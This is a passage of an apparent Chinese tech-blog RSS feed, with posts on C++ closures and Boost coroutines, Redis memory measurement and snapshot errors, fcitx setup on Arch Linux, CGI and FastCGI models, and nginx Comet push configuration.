<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">auto</span> <span style="color: #f0c674;">id_generator_odd</span> = [=]() <span style="color: #b5bd68;">mutable</span> { <span style="color: #81a2be;">int</span> result = base; base += 2; <span style="color: #b5bd68;">return</span><span style="text-decoration: underline;"> result; };</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> base = 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">auto</span> <span style="color: #f0c674;">id_generator_even</span> = [=]() <span style="color: #b5bd68;">mutable</span> { <span style="color: #81a2be;">int</span> result = base; base += 2; <span style="color: #b5bd68;">retur</span><span style="color: #b5bd68; text-decoration: underline;">n</span><span style="text-decoration: underline;"> result; };</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_odd() == 1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_odd() == 3);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_odd() == 5);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_even() == 0);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_even() == 2);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_even() == 4);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(base == 0);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<dl class="org-dl">
<dt>编译</dt><dd><pre class="example">
g++ -g closure.cpp -o closure -std=c++0x
</pre></dd>
</dl>
</div>
</div>

<div id="outline-container-orgd88b7a9" class="outline-3">
<h3 id="orgd88b7a9">协程（Coroutine）</h3>
<div class="outline-text-3" id="text-orgd88b7a9">
<div class="org-src-container">
<pre class="src src-c++"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;boost/bind.hpp&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;boost/coroutine/all.hpp&gt;</span>

<span style="color: #b5bd68;">typedef</span> <span style="color: #81a2be;">boost</span>::<span style="color: #81a2be;">coroutines</span>::<span style="color: #81a2be;">coroutine</span>&lt; <span style="color: #81a2be;">int</span>(<span style="color: #81a2be;">void</span>) &gt; <span style="color: #81a2be;">IDGenerator</span>;

<span style="color: #81a2be;">void</span> <span style="color: #de935f;">idGenerator</span>(<span style="color: #81a2be;">IDGenerator</span>::<span style="color: #81a2be;">caller_type</span>&amp; <span style="color: #f0c674;">ca</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">base</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">step</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">do</span>{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ca(base);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> base += step;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }<span style="color: #b5bd68;">while</span>(<span style="color: #81a2be;">true</span>);
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">IDGenerator</span> <span style="color: #f0c674;">id_generator_odd</span>(<span style="color: #81a2be;">boost</span>::bind(idGenerator, _1, 1, 2));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">IDGenerator</span> <span style="color: #f0c674;">id_generator_even</span>(<span style="color: #81a2be;">boost</span>::bind(idGenerator, _1, 0, 2));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_odd.get() == 1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_odd().get() == 3);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_odd().get() == 5);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_even.get() == 0);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_even().get() == 2);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(id_generator_even().get() == 4);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<dl class="org-dl">
<dt>编译</dt><dd><pre class="example">
g++ -g coroutine.cpp -lboost_context -o coroutine -std=c++0x
</pre></dd>
</dl>
</div>
</div>
</div>

<div id="outline-container-org0149195" class="outline-2">
<h2 id="org0149195">特性比较</h2>
<div class="outline-text-2" id="text-org0149195">
</div>
<div id="outline-container-orgf928c2c" class="outline-3">
<h3 id="orgf928c2c">函数（Function）</h3>
<div class="outline-text-3" id="text-orgf928c2c">
<ul class="org-ul">
<li>无状态</li>
<li>需要独立定义执行体</li>
<li>调用过程中从头到尾执行体内所有代码</li>
<li>在输入相同的情况下，能够保证输出也相同</li>
<li>没有副作用，多线程安全</li>
<li>要借助外部变量保存状态</li>
<li>调用比较麻烦，需要传入保存状态的参数</li>
</ul>
</div>
</div>

<div id="outline-container-orgc6b160a" class="outline-3">
<h3 id="orgc6b160a">闭包（Closure）</h3>
<div class="outline-text-3" id="text-orgc6b160a">
<ul class="org-ul">
<li>有状态，内部直接保存</li>
<li>直接内联定义执行体</li>
<li>调用过程中从头到尾执行体内所有代码</li>
<li>输入相同的情况下，输出可能不同</li>
<li>有副作用，非多线程安全</li>
<li>定义时可以多种方式安全地引用外部变量</li>
<li>调用简单，不需要传入保存状态的参数</li>
</ul>
</div>
</div>

<div id="outline-container-orge0ad9bd" class="outline-3">
<h3 id="orge0ad9bd">协程（Coroutine）</h3>
<div class="outline-text-3" id="text-orge0ad9bd">
<ul class="org-ul">
<li>有状态，内部直接保存</li>
<li>需要独立定义执行体</li>
<li>调用过程中直接从上次的运行状态继续运行</li>
<li>输入相同的情况下，输出可能不同</li>
<li>严禁多线程访问</li>
<li>调用简单，不需要传入保存状态的参数</li>
</ul>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[网页中的自动完成的下拉列表框]]></title>
            <link>/article/7f5198754e2d768481ea52a85b8c621076844e0b62c9521788686846.html</link>
            <guid>/article/7f5198754e2d768481ea52a85b8c621076844e0b62c9521788686846.html</guid>
            <pubDate>Sun, 10 Mar 2013 13:23:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org90ae9e6" class="outline-2">
<h2 id="org90ae9e6">jqueryui的<a href="http://jqueryui.com/autocomplete/#combobox">组件</a></h2>
<div class="outline-text-2" id="text-org90ae9e6">
<p>
示例效果看起来挻好，不过发现几个问题：
</p>

<ul class="org-ul">
<li>和<a href="http://twitter.github.com/bootstrap/">bootstrap</a>有冲突，导致右边的下拉箭头部分都看不见。</li>
<li>操作过程中有时候显示的值和实际的值不一致，应该是中文输入法按键事件在firefox下未触发引起的显示的界面部分和隐藏的select输入框值不同步。</li>
<li>没有提供设置当前选中项、禁用的功能，要自行对生成的界面元素进行处理。</li>
</ul>

<p>
这个只是jqueryui自动完成输入框的一个定制示例，不是很完善，而jqueryui自带的正式版看起来只是一个输入框。
</p>
</div>
</div>

<div id="outline-container-org3d68eb0" class="outline-2">
<h2 id="org3d68eb0"><a href="https://github.com/harvesthq/chosen">chosen</a></h2>
<div class="outline-text-2" id="text-org3d68eb0">
<p>
非常完美，配置很简单，而且界面很漂亮，在github上评分很高。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下跨进程传递文件描述符]]></title>
            <link>/article/linux-4e0b8de88fdb7a0b4f20901265874ef663cf8ff07b26.html</link>
            <guid>/article/linux-4e0b8de88fdb7a0b4f20901265874ef663cf8ff07b26.html</guid>
            <pubDate>Sat, 09 Mar 2013 07:11:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org91a01e5" class="outline-2">
<h2 id="org91a01e5">问题</h2>
<div class="outline-text-2" id="text-org91a01e5">
<p>
在web开发中，以典型的php-fpm为例，对于到外部系统的连接（如：mysql、redis）等都提供了持久连接接口（pconnect），但是受限于多进程模型，事实上是每个php-fpm进程都有单独的一个连接池的（参见：《<a href="http:5f53-php-90474e0a-redis.html">当php遇上redis</a>》），大量空闲连接的存在不仅对系统资源造成了浪费（不单指fd空间，像mysql的每连接一线程会附带大量内存空间：sort_buffer、read_buffer等），而且整个系统将无法横向扩展（如：mysql连接数限制）。如果可以在进程间共享文件描述符，将可以大大提升系统性能，促进多进程模型的应用。
</p>
</div>
</div>

<div id="outline-container-orgc1a405e" class="outline-2">
<h2 id="orgc1a405e">方案</h2>
<div class="outline-text-2" id="text-orgc1a405e">
<p>
在linux平台下，sendmsg、recvmsg可以将一个进程的文件描述符传递给另一进程使用，这使得实现系统级的连接池成为可能。
</p>
</div>
</div>

<div id="outline-container-org144bc96" class="outline-2">
<h2 id="org144bc96">实现</h2>
<div class="outline-text-2" id="text-org144bc96">
<p>
《The Linux Programming Interface》61.13.3 Passing File Descriptors
</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Web模型初探]]></title>
            <link>/article/web-6a21578b521d63a2.html</link>
            <guid>/article/web-6a21578b521d63a2.html</guid>
            <pubDate>Thu, 28 Feb 2013 07:07:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org6f6378c" class="outline-2">
<h2 id="org6f6378c">CGI</h2>
<div class="outline-text-2" id="text-org6f6378c">
<p>
全称为Common Gateway Interface，即公共网关接口。
当Web服务器收到一个请求时，运行相应的处理程序，相关参数通过标准输入传递给处理程序，处理程序的标准输出做为响应内容，处理程序运行结束后将响应发送给客户端。
</p>

<ul class="org-ul">
<li><p>
性能 *
</p>

<p>
进程级，每请求一进程。进程创建有很大的开销，并发数与系统资源消耗呈线性增长，有限的系统资源成为瓶颈。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org63cf136" class="outline-2">
<h2 id="org63cf136">FastCGI</h2>
<div class="outline-text-2" id="text-org63cf136">
<p>
为CGI的改良，CGI程序做为独立的网络后台程序运行，当Web服务器收到一个请求时，发起一个tcp请求到处理程序，通过该tcp连接传入相关参数，处理程序的响应也通过该tcp连接发回给Web服务器，处理程序关闭该连接表示处理完毕，Web服务器最终将响应发送给客户端。
</p>

<ul class="org-ul">
<li><p>
性能 **
</p>

<p>
网络级，每请求一连接。CGI的改良，重用进程，进程处理完一个请求后再处理下一请求，对于多个请求，只需要付出一次进程创建的开销，可以在后继请求重用资源（从文件载入的配置项、查询到的数据、打开的文件、数据库连接等）。因为处理程序是串行处理请求，往往需要同时运行多个处理程序以提升并发处理能力，这些处理程序无法共享资源以进一步提升性能。
</p></li>

<li><p>
附录
</p>

<p>
Web服务器可重用到服务程序的连接进一步提升性能（如：nginx的<a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive">upstream_keepalive</a>）。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgadd7bf3" class="outline-2">
<h2 id="orgadd7bf3">WSGI</h2>
</div>

<div id="outline-container-orgdf3bda5" class="outline-2">
<h2 id="orgdf3bda5">uWSGI</h2>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[估算redis内存占用]]></title>
            <link>/article/4f307b97-redis-51855b5853607528.html</link>
            <guid>/article/4f307b97-redis-51855b5853607528.html</guid>
            <pubDate>Sun, 16 Dec 2012 07:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
参考: <a href="http://lethain.com/notes-on-redis-memory-usage/">Notes on Redis Memory Usage</a>
</p>

<ul class="org-ul">
<li>测试环境
<dl class="org-dl">
<dt>redis版本</dt><dd>redis_version:2.4.4</dd>
<dt>操作系统（uname -a）</dt><dd>Linux CentOS 2.6.32-220.13.1.el6.x86_64 #1 SMP Tue Apr 17 23:56:34 BST 2012 x86_64 x86_64 x86_64 GNU/Linux</dd>
<dt>python版本（python &#x2013;version）</dt><dd>Python 2.6.6</dd>
</dl></li>
</ul>

<div id="outline-container-orgee11a0c" class="outline-2">
<h2 id="orgee11a0c">Strings</h2>
<div class="outline-text-2" id="text-orgee11a0c">
<ul class="org-ul">
<li><p>
测试脚本
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/env python</span>

<span style="color: #b5bd68;">import</span> redis
<span style="color: #b5bd68;">import</span> uuid
<span style="color: #b5bd68;">import</span> time

<span style="color: #f0c674;">r</span> = redis.Redis(host=<span style="color: #8abeb7;">'localhost'</span>, port=6379, db=0)
<span style="color: #b5bd68;">for</span> num_strings <span style="color: #b5bd68;">in</span> (100000,):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   r.flushall()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   time.sleep(1.0)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">initial_size</span> = r.dbsize()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">initial_info</span> = r.info()

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span> i <span style="color: #b5bd68;">in</span> <span style="color: #b294bb;">xrange</span>(0, num_strings):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   r.<span style="color: #b294bb;">set</span>(<span style="color: #b294bb;">str</span>(uuid.uuid4()), time.time())
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">r.setex(str(uuid.uuid4()), time.time(), 100000)</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">final_size</span> = r.dbsize()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">final_info</span> = r.info()

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"For %s strings."</span> % (num_strings,)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Keys: %s =&gt; %s"</span> % (initial_size, final_size)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory: %s =&gt; %s"</span> % (initial_info[<span style="color: #8abeb7;">'used_memory'</span>],
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   final_info[<span style="color: #8abeb7;">'used_memory'</span>])
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory per key: %d"</span>%((<span style="color: #b294bb;">int</span>(final_info[<span style="color: #8abeb7;">'used_memory'</span>]) - <span style="color: #b294bb;">int</span>(initial_in<span style="text-decoration: underline;">fo[</span><span style="color: #8abeb7; text-decoration: underline;">'used_memory'</span><span style="text-decoration: underline;">])) / num_strings)</span>
</pre>
</div></li>
<li>测试结果
<dl class="org-dl">
<dt>set</dt><dd>每个key-value占用138字节，可见redis本身的维护开销为89字节</dd>
<dt>setex</dt><dd>每个key-value占用180字节，可见redis本身的维护开销为131字节，启用过期时间需要42字节开销（这是因为redis使用新的链表保存设置了过期时间的条目）。</dd>
</dl></li>
</ul>
</div>
</div>

<div id="outline-container-org1d79da7" class="outline-2">
<h2 id="org1d79da7">Sets</h2>
<div class="outline-text-2" id="text-org1d79da7">
<ul class="org-ul">
<li><p>
测试脚本
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/env python</span>

<span style="color: #b5bd68;">import</span> redis
<span style="color: #b5bd68;">import</span> math
<span style="color: #b5bd68;">import</span> time

<span style="color: #f0c674;">r</span> = redis.Redis(host=<span style="color: #8abeb7;">'localhost'</span>, port=6379, db=0)
<span style="color: #f0c674;">set_capcity</span> = <span style="color: #b294bb;">int</span>(r.config_get(<span style="color: #8abeb7;">"set-max-intset-entries"</span>)[<span style="color: #8abeb7;">"set-max-intset-entries</span><span style="color: #8abeb7; text-decoration: underline;">"</span><span style="text-decoration: underline;">])</span>

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">set_name</span>(i, num_strings, set_capcity):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">set_num</span> = math.ceil(num_strings/<span style="color: #b294bb;">float</span>(set_capcity))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">"s%d"</span>%(i%set_num)

<span style="color: #b5bd68;">for</span> num_strings <span style="color: #b5bd68;">in</span> (100000,):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   r.flushall()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   time.sleep(1.0)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">initial_size</span> = r.dbsize()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">initial_info</span> = r.info()

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span> i <span style="color: #b5bd68;">in</span> <span style="color: #b294bb;">xrange</span>(0, num_strings):
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">r.sadd("s", str(i))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   r.sadd(set_name(i, num_strings, set_capcity), <span style="color: #b294bb;">str</span>(i))
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">final_size</span> = r.dbsize()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">final_info</span> = r.info()

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"For %s strings."</span> % (num_strings,)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Keys: %s =&gt; %s"</span> % (initial_size, final_size)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory: %s =&gt; %s"</span> % (initial_info[<span style="color: #8abeb7;">'used_memory'</span>],
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   final_info[<span style="color: #8abeb7;">'used_memory'</span>])
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory per key: %d"</span>%((<span style="color: #b294bb;">int</span>(final_info[<span style="color: #8abeb7;">'used_memory'</span>]) - <span style="color: #b294bb;">int</span>(initial_in<span style="text-decoration: underline;">fo[</span><span style="color: #8abeb7; text-decoration: underline;">'used_memory'</span><span style="text-decoration: underline;">])) / num_strings)</span>

</pre>
</div></li>

<li><p>
测试结果
</p>
<dl class="org-dl">
<dt>启用压缩</dt><dd>每个value占用4字节</dd>
<dt>不启用压缩</dt><dd>每个value占用39字节</dd>
</dl>
<p>
注意: redis的set仅当值为整型，压缩才会生效。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org2f62bae" class="outline-2">
<h2 id="org2f62bae">内存预留</h2>
<div class="outline-text-2" id="text-org2f62bae">
<p>
除非你能够保证你的机器总是有一半的空闲内存，否则别使用快照方式持久化数据或者通过执行BGREWRITEAOF压缩aof文件。
redis在执行bgsave时，会进行一次fork，fork后的进程负责将内存中的数据写入磁盘，由于fork采用Copy-On-Write，两个redis进程共享内存中的数据。redis如果有数据更新，则会将对应的共享内存页创建一份副本再更新，当更新操作足够频繁时，共享的内存空间会迅速地副本化，导致物理内存被耗光，系统被迫动用交换空间，从而导致redis服务极不稳定，整个系统堵塞在磁盘io上。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决保存快照失败后redis无法写入的问题]]></title>
            <link>/article/89e351b34fdd5b585feb716759318d25540e-redis-65e06cd551995165768495ee9898.html</link>
            <guid>/article/89e351b34fdd5b585feb716759318d25540e-redis-65e06cd551995165768495ee9898.html</guid>
            <pubDate>Sun, 16 Dec 2012 07:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
用命令行工具连上后执行“set test 0”出现以下错误提示：
</p>
<pre class="example">
MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.
</pre>
<p>
这个应该是之前强制停止redis快照导致的，查看redis快照状态证实了这一点：
</p>
<pre class="example">
redis 127.0.0.1:6379&gt; info
...
rdb_last_bgsave_status:err
...
</pre>
<p>
通过关闭配置项stop-writes-on-bgsave-error解决该问题。
</p>
<pre class="example">
redis 127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用hash表结构减少redis内存占用]]></title>
            <link>/article/4f7f7528-hash-88687ed3678451cf5c11-redis-51855b5853607528.html</link>
            <guid>/article/4f7f7528-hash-88687ed3678451cf5c11-redis-51855b5853607528.html</guid>
            <pubDate>Sun, 16 Dec 2012 07:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
当hash结构中的元素较少（少于redis.conf:hash-max-zipmap-entries指定的数量时，配置成&lt;=1000，过大会减低处理速度，参见： <a href="http://stackoverflow.com/questions/11281734/redis-using-hashes">这里</a> 和 <a href="http://instagram-engineering.tumblr.com/post/12202313862/storing-hundreds-of-millions-of-simple-key-value-pairs">这里</a> ）且数据为整型时，redis使用特殊的方式（数组保存，时间换空间）保存hash结构以减少内存占用，参见 <a href="http://redis.io/topics/memory-optimization">这里</a> 和 <a href="http://stackoverflow.com/questions/9625246/what-are-the-underlying-data-structures-used-for-redis">这里</a> 。但当hash结构超过指定数量时将使用普通的<a href="http://redis.io/commands#string">字符串</a>方式保存，也就无法再节省内存了。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下安装fcitx输入法]]></title>
            <link>/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html</link>
            <guid>/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html</guid>
            <pubDate>Sat, 15 Dec 2012 13:56:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org6032235" class="outline-2">
<h2 id="org6032235">安装</h2>
<div class="outline-text-2" id="text-org6032235">
<div class="org-src-container">
<pre class="src src-sh">sudo yaourt -S fcitx-im
ln -s /etc/xdg/autostart/fcitx-autostart.desktop  ~/.config/autostart/
</pre>
</div>
</div>
</div>

<div id="outline-container-org656643b" class="outline-2">
<h2 id="org656643b">配置</h2>
<div class="outline-text-2" id="text-org656643b">
<p>
在配置文件~/.xprofile中添加以下内容：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">GTK_IM_MODULE</span>=fcitx
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">QT_IM_MODULE</span>=fcitx
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">XMODIFIERS</span>=<span style="color: #8abeb7;">"@im=fcitx"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">LC_CTYPE</span>=<span style="color: #8abeb7;">"zh_CN.UTF-8"</span>
</pre>
</div>

<p>
因为用的是gnome3桌面，需要禁用ibus：
</p>
<pre class="example">
gsettings set org.gnome.settings-daemon.plugins.keyboard active false
</pre>
<p>
还需要在键盘快捷键设置界面中将输入源切换的快捷键清除。
</p>

<p>
打开 fcitx-configtool 在 Input Method 中添加 Keyboard - English(US) 和 WubiPinyin，
现在可以 Ctrl + Space 切换输入法，进行中英文输入了。
</p>

<p>
可以取消 fcitx 绑定的全局快捷键，如 emacs 要用 Ctrl+Alt+P，
fcitx-configtool GUI 工具不能将全局快捷键置空，
可以直接修改配置文件 ~/.config/fcitx/config 删除快捷键。
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Switch Embeded Preedit</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">SwitchPreedit=CTRL_ALT_P</span>
</pre>
</div>
<p>
改成
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Switch Embeded Preedit</span>
<span style="color: #f0c674;">SwitchPreedit</span>=
</pre>
</div>
<p>
这是因为 fcitx 的配置如果为默认值，则直接注释掉，重启 fcitx 生效配置。
</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Nginx Comet: 基于 HTTP 长连接的“服务器推”技术]]></title>
            <link>/article/nginx-comet-57fa4e8e-http-957f8fde63a57684201c670d52a1566863a8201d6280672f.html</link>
            <guid>/article/nginx-comet-57fa4e8e-http-957f8fde63a57684201c670d52a1566863a8201d6280672f.html</guid>
            <pubDate>Fri, 14 Dec 2012 13:09:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgc8aedee" class="outline-2">
<h2 id="orgc8aedee">简介</h2>
<div class="outline-text-2" id="text-orgc8aedee">
<p>
可参考这篇文章：<a href="http://www.ibm.com/developerworks/cn/web/wa-lo-comet/">Comet：基于 HTTP 长连接的“服务器推”技术</a>
</p>
</div>
</div>

<div id="outline-container-org99fe97f" class="outline-2">
<h2 id="org99fe97f"><a href="https://github.com/slact/nginx_http_push_module">nginx_http_push_module</a> （不建议使用）</h2>
<div class="outline-text-2" id="text-org99fe97f">
<p>
这个模块功能上没有问题，网上介绍的文章相对比较多，但是存在严重的内存泄露问题，而且发现使用kill -HUP的方式优雅重启nginx虽会释放一部分内存，但nginx错误日志显示有共享内存锁相关的冲突，我们不得不每小时彻底重启一次nginx。简单说一下就是它使用一个全局的内存池来分配订阅者及响应需要的内存空间，但是从nginx内存池分配的小内存块（&lt; pagesize，4096）是不会释放的也不会归还到池中进行重用，具体可查看nginx源码的ngx_palloc和ngx_pfree函数进行验证。
</p>

<p>
可google "nginx中mod_push模块内存分配改造"，在作者的<a href="http://http//blog.lifeibo.com/">网站</a>正在改版暂时找不到该文章。
</p>

<p>
<a href="http://bsd.ee/~hadara/blog/?p=215=1">这里</a>也有人<a href="https://github.com/slact/nginx_http_push_module/pull/60">指出</a>该问题，同时该文作者也fork了一个分枝，但是我试了一下，除了不支持push_channel_timeout特性外，还是一样有内存泄露。
</p>

<dl class="org-dl">
<dt>参考配置</dt><dd></dd>
</dl>
<pre class="example">
location ~ ^/publish$ {
    allow 127.0.0.1;
    deny all;
    set $push_channel_id $arg_id;
    push_publisher;
    push_delete_oldest_received_message on;
    push_message_timeout 5s;
    #push_channel_timeout 60s;
    push_store_messages off;
}

location ~ ^/activity$ {
    if ($args ~ "callback=(.+)" ) {
        rewrite ^/activity "/activity_jsonp" last;
    }
    push_subscriber;
    push_subscriber_timeout 60s;
    push_subscriber_concurrency first;
    push_max_channel_subscribers 1;
